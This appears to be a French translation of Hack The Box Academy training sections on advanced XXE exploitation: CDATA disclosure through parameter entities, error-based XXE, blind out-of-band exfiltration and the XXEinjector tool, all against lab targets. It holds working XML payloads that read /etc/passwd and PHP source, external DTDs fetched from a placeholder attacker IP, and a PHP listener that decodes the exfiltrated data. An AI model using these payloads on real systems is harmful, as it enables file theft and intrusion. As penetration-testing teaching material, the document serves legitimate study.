Divulgation avancée des fichiers
================================

* * * * *

Toutes les vulnérabilités XXE peuvent ne pas être simples à exploiter, comme nous l'avons vu dans la section précédente. Certains formats de fichiers peuvent ne pas être lisibles via XXE de base, tandis que dans d'autres cas, l'application Web peut ne pas générer de valeurs d'entrée dans certains cas, nous pouvons donc essayer de la forcer à traverser des erreurs.

* * * * *

Exfiltration avancée avec CDATA
-------------------------------

Dans la section précédente, nous avons vu comment nous pouvions utiliser des filtres PHP pour encoder les fichiers source PHP, de sorte qu'ils ne cassent pas le format XML lorsqu'ils sont référencés, ce qui (comme nous l'avons vu) nous empêchait de lire ces fichiers. Mais qu'en est-il des autres types d'applications Web ? Nous pouvons utiliser une autre méthode pour extraire tout type de données (y compris les données binaires) pour tout backend d'application Web. Pour sortir des données qui ne sont pas conformes au format XML, nous pouvons envelopper le contenu de la référence du fichier externe avec une `CDATA`balise (par exemple `<![CDATA[ FILE_CONTENT ]]>`). De cette façon, l'analyseur XML considérerait cette partie comme des données brutes, qui peuvent contenir n'importe quel type de données, y compris des caractères spéciaux.

Un moyen simple de résoudre ce problème serait de définir une `begin`entité interne avec `<![CDATA[`, une `end`entité interne avec `]]>`, puis de placer notre fichier d'entité externe entre les deux, et il devrait être considéré comme un `CDATA`élément, comme suit :

Code : xml

```
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>

```

Après cela, si nous référençons l' `&joined;`entité, elle doit contenir nos données échappées. Cependant, `this will not work, since XML prevents joining internal and external entities`nous devrons donc trouver une meilleure façon de le faire.

Pour contourner cette limitation, nous pouvons utiliser `XML Parameter Entities`, un type spécial d'entité qui commence par un `%`caractère et ne peut être utilisé que dans la DTD. Ce qui est unique avec les entités paramètres, c'est que si nous les référençons à partir d'une source externe (par exemple, notre propre serveur), alors toutes seront considérées comme externes et peuvent être jointes, comme suit :

Code : xml

```
<!ENTITY joined "%begin;%file;%end;">

```

Essayons donc de lire le `submitDetails.php`fichier en stockant d'abord la ligne ci-dessus dans un fichier DTD (par exemple `xxe.dtd`), en l'hébergant sur notre machine, puis en la référençant en tant qu'entité externe sur l'application Web cible, comme suit :

```
dsgsec@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
dsgsec@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

Maintenant, nous pouvons référencer notre entité externe ( `xxe.dtd`) puis imprimer l' `&joined;`entité que nous avons définie ci-dessus, qui doit contenir le contenu du `submitDetails.php`fichier, comme suit :

Code : xml

```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->

```

Une fois que nous avons écrit notre `xxe.dtd`fichier, l'avons hébergé sur notre machine, puis ajouté les lignes ci-dessus à notre requête HTTP à l'application Web vulnérable, nous pouvons enfin obtenir le contenu du `submitDetails.php`fichier : ![php_cdata](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_cdata.jpg)

Comme nous pouvons le constater, nous avons pu obtenir le code source du fichier sans avoir besoin de l'encoder en base64, ce qui permet de gagner beaucoup de temps lors de la recherche de secrets et de mots de passe dans divers fichiers.

Remarque : Dans certains serveurs Web modernes, nous ne pourrons peut-être pas lire certains fichiers (comme index.php), car le serveur Web empêcherait une attaque DOS causée par l'auto-référence de fichier/entité (par exemple, boucle de référence d'entité XML) , comme mentionné dans la section précédente.

Cette astuce peut devenir très pratique lorsque la méthode XXE de base ne fonctionne pas ou lorsqu'il s'agit d'autres frameworks de développement Web. `Try to use this trick to read other files`.

* * * * *

XXE basé sur les erreurs
------------------------

Une autre situation dans laquelle nous pouvons nous trouver est celle où l'application Web peut ne pas écrire de sortie, de sorte que nous ne pouvons contrôler aucune des entités d'entrée XML pour écrire son contenu. Dans de tels cas, nous serions `blind`à la sortie XML et ne serions donc pas en mesure de récupérer le contenu du fichier en utilisant nos méthodes habituelles.

Si l'application Web affiche des erreurs d'exécution (par exemple, des erreurs PHP) et ne dispose pas d'une gestion appropriée des exceptions pour l'entrée XML, nous pouvons utiliser cette faille pour lire la sortie de l'exploit XXE. Si l'application Web n'écrit pas de sortie XML ni n'affiche d'erreurs, nous serions confrontés à une situation complètement aveugle, dont nous parlerons dans la section suivante.

Considérons l'exercice que nous avons `/error`à la fin de cette section, dans lequel aucune des entités d'entrée XML n'est affichée à l'écran. Pour cette raison, nous n'avons aucune entité que nous pouvons contrôler pour écrire la sortie du fichier. Essayons d'abord d'envoyer des données XML malformées et voyons si l'application Web affiche des erreurs. Pour ce faire, nous pouvons supprimer n'importe laquelle des balises de fermeture, en modifier une pour qu'elle ne se ferme pas (par exemple `<roo>`à la place de `<root>`), ou simplement référencer une entité inexistante, comme suit : ![cause_error](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_cause_error.jpg)

Nous voyons que nous avons effectivement provoqué l'affichage d'une erreur dans l'application Web, et cela a également révélé le répertoire du serveur Web, que nous pouvons utiliser pour lire le code source d'autres fichiers. Maintenant, nous pouvons exploiter cette faille pour exfiltrer le contenu du fichier. Pour ce faire, nous utiliserons une technique similaire à celle que nous avons utilisée précédemment. Tout d'abord, nous allons héberger un fichier DTD contenant la charge utile suivante :

Code : xml

```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

```

La charge utile ci-dessus définit l' `file`entité de paramètre, puis la joint à une entité qui n'existe pas. Dans notre exercice précédent, nous joignions trois chaînes. Dans ce cas, `%nonExistingEntity;`n'existe pas, de sorte que l'application Web génère une erreur indiquant que cette entité n'existe pas, ainsi que notre joint `%file;`dans le cadre de l'erreur. De nombreuses autres variables peuvent provoquer une erreur, comme un mauvais URI ou des caractères incorrects dans le fichier référencé.

Maintenant, nous pouvons appeler notre script DTD externe, puis référencer l' `error`entité, comme suit :

Code : xml

```
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>

```

Une fois que nous avons hébergé notre script DTD comme nous l'avons fait précédemment et envoyé la charge utile ci-dessus en tant que nos données XML (inutile d'inclure d'autres données XML), nous obtiendrons le contenu du `/etc/hosts`fichier comme suit : ![erreur_exfil](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_exfil_error_2.jpg)

Cette méthode peut également être utilisée pour lire le code source des fichiers. Tout ce que nous avons à faire est de changer le nom du fichier dans notre script DTD pour qu'il pointe vers le fichier que nous voulons lire (par exemple `"file:///var/www/html/submitDetails.php"`). Cependant, `this method is not as reliable as the previous method for reading source files`, car il peut avoir des limites de longueur, et certains caractères spéciaux peuvent toujours le casser.Exfiltration de données en aveugle
==================================

* * * * *

Dans la section précédente, nous avons vu un exemple de vulnérabilité XXE aveugle, où nous n'avons reçu aucune sortie contenant aucune de nos entités d'entrée XML. Comme le serveur web affichait des erreurs d'exécution PHP, nous pouvions utiliser cette faille pour lire le contenu des fichiers à partir des erreurs affichées. Dans cette section, nous verrons comment nous pouvons obtenir le contenu des fichiers dans une situation complètement aveugle, où nous n'obtenons ni la sortie d'aucune des entités XML ni aucune erreur PHP affichée.

* * * * *

Exfiltration de données hors bande
----------------------------------

Si nous essayons de répéter l'une des méthodes avec l'exercice que nous trouvons à `/blind`, nous remarquerons rapidement qu'aucune d'entre elles ne semble fonctionner, car nous n'avons aucun moyen d'imprimer quoi que ce soit sur la réponse de l'application Web. Pour de tels cas, nous pouvons utiliser une méthode connue sous le nom de `Out-of-band (OOB) Data Exfiltration`, qui est souvent utilisée dans des cas aveugles similaires avec de nombreuses attaques Web, comme les injections SQL aveugles, les injections de commandes aveugles, XSS aveugle et, bien sûr, XXE aveugle. Les modules [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss) et [Whitebox Pentesting 101: Command Injections](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection) ont tous deux discuté d'attaques similaires, et ici nous utiliserons une attaque similaire, avec de légères modifications pour s'adapter à notre vulnérabilité XXE.

Lors de nos attaques précédentes, nous avons utilisé une `out-of-band`attaque puisque nous avons hébergé le fichier DTD dans notre machine et avons fait en sorte que l'application Web se connecte à nous (donc hors bande). Donc, notre attaque cette fois sera assez similaire, avec une différence significative. Au lieu que l'application Web produise notre `file`entité vers une entité XML spécifique, nous ferons en sorte que l'application Web envoie une requête Web à notre serveur Web avec le contenu du fichier que nous lisons.

Pour ce faire, nous pouvons d'abord utiliser une entité de paramètre pour le contenu du fichier que nous lisons tout en utilisant le filtre PHP pour l'encoder en base64. Ensuite, nous allons créer une autre entité de paramètre externe et la référencer à notre IP, et placer la `file`valeur du paramètre dans le cadre de l'URL demandée via HTTP, comme suit :

Code : xml

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">

```

Si, par exemple, le fichier que nous voulons lire avait le contenu de `XXE_SAMPLE_DATA`, alors le `file`paramètre contiendrait ses données encodées en base64 ( `WFhFX1NBTVBMRV9EQVRB`). Lorsque le XML essaie de référencer le `oob`paramètre externe de notre machine, il demandera `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Enfin, nous pouvons décoder la `WFhFX1NBTVBMRV9EQVRB`chaîne pour obtenir le contenu du fichier. Nous pouvons même écrire un simple script PHP qui détecte automatiquement le contenu du fichier encodé, le décode et le renvoie au terminal :

Code : php

```
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>

```

Ainsi, nous allons d'abord écrire le code PHP ci-dessus sur `index.php`, puis démarrer un serveur PHP sur le port `8000`, comme suit :

```
dsgsec@htb[/htb]$ vi index.php # here we write the above PHP code
dsgsec@htb[/htb]$ php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started

```

Maintenant, pour lancer notre attaque, nous pouvons utiliser une charge utile similaire à celle que nous avons utilisée dans l'attaque basée sur les erreurs, et simplement ajouter , `<root>&content;</root>`qui est nécessaire pour référencer notre entité et lui faire envoyer la requête à notre machine avec le contenu du fichier :

Code : xml

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>

```

Ensuite, nous pouvons envoyer notre requête à l'application Web : ![blind_request](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_blind_request.jpg)

Enfin, nous pouvons retourner à notre terminal, et nous verrons que nous avons bien récupéré la requête et son contenu décodé :

```
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...

```

Conseil : En plus de stocker nos données encodées en base64 en tant que paramètre de notre URL, nous pouvons les utiliser `DNS OOB Exfiltration`en plaçant les données encodées en tant que sous-domaine de notre URL (par exemple `ENCODEDTEXT.our.website.com`), puis utiliser un outil comme `tcpdump`pour capturer tout trafic entrant et décoder la chaîne de sous-domaine pour obtenir les données. Certes, cette méthode est plus avancée et nécessite plus d'efforts pour exfiltrer les données.

* * * * *

Exfiltration OOB automatisée
----------------------------

Bien que dans certains cas, nous devions utiliser la méthode manuelle que nous avons apprise ci-dessus, dans de nombreux autres cas, nous pouvons automatiser le processus d'exfiltration aveugle des données XXE avec des outils. L'un de ces outils est [XXEinjector](https://github.com/enjoiz/XXEinjector) . Cet outil prend en charge la plupart des astuces que nous avons apprises dans ce module, y compris le XXE de base, l'exfiltration de source CDATA, le XXE basé sur les erreurs et le XXE OOB aveugle.

Pour utiliser cet outil pour l'exfiltration OOB automatisée, nous pouvons d'abord cloner l'outil sur notre machine, comme suit :

```
dsgsec@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git

Cloning into 'XXEinjector'...
...SNIP...

```

Une fois que nous avons l'outil, nous pouvons copier la requête HTTP de Burp et l'écrire dans un fichier pour que l'outil l'utilise. Nous ne devons pas inclure les données XML complètes, uniquement la première ligne, et écrire `XXEINJECT`après comme localisateur de position pour l'outil :

Code : http

```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT

```

Maintenant, nous pouvons exécuter l'outil avec les drapeaux `--host`/ `--httpport`étant notre adresse IP et notre port, le `--file`drapeau étant le fichier que nous avons écrit ci-dessus et le `--path`drapeau étant le fichier que nous voulons lire. Nous sélectionnerons également les drapeaux `--oob=http`et `--phpfilter`pour répéter l'attaque OOB que nous avons faite ci-dessus, comme suit :

```
dsgsec@htb[/htb]$ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:

```

On voit que l'outil n'a pas imprimé directement les données. C'est parce que nous encodons les données en base64, elles ne sont donc pas imprimées. Dans tous les cas, tous les fichiers exfiltrés sont stockés dans le `Logs`dossier sous l'outil, et nous pouvons y trouver notre fichier :

```
dsgsec@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP..

```

Essayez d'utiliser l'outil pour répéter d'autres méthodes XXE que nous avons apprises.
